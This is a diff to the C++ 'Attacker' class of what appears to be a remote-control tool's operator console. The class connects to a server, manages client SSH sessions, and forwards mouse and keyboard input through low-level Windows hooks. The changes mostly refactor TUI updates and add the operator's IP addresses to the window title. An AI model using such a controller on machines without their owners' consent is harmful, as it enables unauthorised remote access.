@@ -15,9 +15,7 @@ Attacker* Attacker::attacker = nullptr;
 Attacker::Attacker(std::string inHId, ftxui::Tui& inTui)
 	:
 	myHId(inHId),
-	tui(inTui),
-	isSendingMouse(inTui.is_sending_mouse),
-	isSendingKeyboard(inTui.is_sending_keyboard)
+	tui(inTui)
 {
 	attacker = this;
 
@@ -25,6 +23,10 @@ Attacker::Attacker(std::string inHId, ftxui::Tui& inTui)
 		while (true)
 			receiveTcp();
 		});
+
+	auto priv = sf::IpAddress::getLocalAddress().value_or(sf::IpAddress::Any).toString();
+	auto publ = sf::IpAddress::getPublicAddress().value_or(sf::IpAddress::Any).toString();
+	tui.setTitle(" " + myHId + " - " + priv + " / " + publ);
 
 	std::thread([] {
 		auto m = SetWindowsHookEx(WH_MOUSE_LL, LowLevelMouseProc, NULL, 0);
@@ -71,9 +73,11 @@ int Attacker::update()
 				isSshActive = false;
 				isSendingMouse = false;
 				isSendingKeyboard = false;
+				tui.setIsSendingMouse(isSendingMouse);
+				tui.setIsSendingKeyboard(isSendingKeyboard);
 
-				tui.ssh_title = ftxui::text("SSH (0)") | ftxui::color(ftxui::Color::Red);
 				tui.ssh_commands = std::queue<std::string>();
+				tui.setSshTitle(ftxui::text("SSH (0)") | ftxui::color(ftxui::Color::Red));
 				tui.printSshShell("\n \n");
 			}
 			//send ssh data
@@ -135,11 +139,12 @@ void Attacker::receiveTcp()
 			isSendingMouse = false;
 			isSendingKeyboard = false;
 
-			tui.clients_overview_output = "Server connection required";
-			tui.server_database_output = "Server connection and admin privileges required";
-			tui.info_title = ftxui::text("Not connected") | ftxui::color(ftxui::Color::Red);
-			tui.ssh_title = ftxui::text("SSH (0)") | ftxui::color(ftxui::Color::Red);
-			tui.triggerRedraw();
+			tui.setIsSendingMouse(isSendingMouse);
+			tui.setIsSendingKeyboard(isSendingKeyboard);
+			tui.setClientsOutput("Server connection required");
+			tui.setDatabaseOutput("Server connection and admin privileges required");
+			tui.setInfoTitle(ftxui::text("Not connected") | ftxui::color(ftxui::Color::Red));
+			tui.setSshTitle(ftxui::text("SSH (0)") | ftxui::color(ftxui::Color::Red));
 		}
 		sf::sleep(sf::milliseconds(100));
 	}
@@ -167,11 +172,12 @@ void Attacker::connectServer(std::stringstream& ss, bool pw)
 	isSendingKeyboard = false;
 	server.disconnect();
 
-	tui.clients_overview_output = "Server connection required";
-	tui.server_database_output = "Server connection and admin privileges required";
-	tui.info_title = ftxui::text("Not connected") | ftxui::color(ftxui::Color::Red);
-	tui.ssh_title = ftxui::text("SSH (0)") | ftxui::color(ftxui::Color::Red);
-	tui.triggerRedraw();
+	tui.setIsSendingMouse(isSendingMouse);
+	tui.setIsSendingKeyboard(isSendingKeyboard);
+	tui.setClientsOutput("Server connection required");
+	tui.setDatabaseOutput("Server connection and admin privileges required");
+	tui.setInfoTitle(ftxui::text("Not connected") | ftxui::color(ftxui::Color::Red));
+	tui.setSshTitle(ftxui::text("SSH (0)") | ftxui::color(ftxui::Color::Red));
 
 	std::string ipStr;
 	short port = 0;
@@ -278,8 +284,7 @@ void Attacker::connectServer(std::stringstream& ss, bool pw)
 	isAdmin = pw;
 
 	std::string add = server.getRemoteAddress().value().toString() + ":" + std::to_string(server.getRemotePort());
-	tui.info_title = ftxui::text("Connected to " + add) | ftxui::color(ftxui::Color::Green);
-	tui.triggerRedraw();
+	tui.setInfoTitle(ftxui::text("Connected to " + add) | ftxui::color(ftxui::Color::Green));
 
 	if (pw)
 		tui.printServerShell("admin access granted (" + std::to_string(myId) + ")\n");
@@ -302,8 +307,7 @@ bool Attacker::handleCmd(const std::string& s)
 		break;
 	}
 	case hash("clear"): {
-		tui.server_shell_output = "";
-		tui.triggerRedraw();
+		tui.clearServerShell();
 		break;
 	}
 	case hash("connect"): {
@@ -449,10 +453,10 @@ bool Attacker::handleCmd(const std::string& s)
 		uint8_t code = 0;
 		res >> code;
 		if (code == 1) {
-			tui.ssh_shell_output = "";
 			isSshActive = true;
 
-			tui.ssh_title = ftxui::text("SSH (" + std::to_string(oId) + ")") | ftxui::color(ftxui::Color::Green);
+			tui.clearSshShell();
+			tui.setSshTitle(ftxui::text("SSH (" + std::to_string(oId) + ")") | ftxui::color(ftxui::Color::Green));
 			tui.printServerShell("loading ssh session...\n");
 		}
 		else if (code == 2)
@@ -505,7 +509,7 @@ bool Attacker::handleCmd(const std::string& s)
 	case hash("togglemouse"): {
 		if (isSshActive) {
 			isSendingMouse = !isSendingMouse;
-			tui.triggerRedraw();
+			tui.setIsSendingMouse(isSendingMouse);
 		}
 		else
 			tui.printServerShell("ssh must be active\n");
@@ -515,7 +519,7 @@ bool Attacker::handleCmd(const std::string& s)
 	case hash("togglekeyboard"): {
 		if (isSshActive) {
 			isSendingKeyboard = !isSendingKeyboard;
-			tui.triggerRedraw();
+			tui.setIsSendingKeyboard(isSendingKeyboard);
 		}
 		else
 			tui.printServerShell("ssh must be active\n");
@@ -544,8 +548,9 @@ void Attacker::handlePacket(sf::Packet& p)
 		isSendingMouse = false;
 		isSendingKeyboard = false;
 
-		tui.ssh_title = ftxui::text("SSH (0)") | ftxui::color(ftxui::Color::Red);
-		tui.triggerRedraw();
+		tui.setIsSendingMouse(isSendingMouse);
+		tui.setIsSendingKeyboard(isSendingKeyboard);
+		tui.setSshTitle(ftxui::text("SSH (0)") | ftxui::color(ftxui::Color::Red));
 	}
 	else if (cmd == uint8_t(Cmd::SSH_DATA)) {
 		if (!isSshActive)
@@ -576,10 +581,10 @@ void Attacker::updateList(sf::Packet& p)
 			else
 				ss_database << "not banned\n";
 		}
-		tui.server_database_output = ss_database.str();
+		tui.setDatabaseOutput(ss_database.str());
 	}
 	else if (isInitialized)
-		tui.server_database_output = "Admin privileges required";
+		tui.setDatabaseOutput("Admin privileges required");
 
 	p >> clientsSize;
 	std::stringstream ss_clients("");
@@ -599,8 +604,7 @@ void Attacker::updateList(sf::Packet& p)
 
 		ss_clients << "\n";
 	}
-	tui.clients_overview_output = ss_clients.str();
-	tui.triggerRedraw();
+	tui.setClientsOutput(ss_clients.str());
 }
 
 LRESULT CALLBACK Attacker::LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lParam)
